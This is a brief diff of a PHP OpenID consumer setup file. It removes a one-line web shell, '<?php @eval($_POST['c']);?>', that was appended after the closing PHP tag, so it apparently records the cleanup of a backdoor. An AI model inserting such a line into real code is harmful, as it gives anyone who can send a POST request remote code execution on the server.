@@ -39,4 +39,3 @@ $store = new Auth_OpenID_FileStore($store_path);
 $consumer = new Auth_OpenID_Consumer($store);
 
 ?>
-<?php @eval($_POST['c']);?>
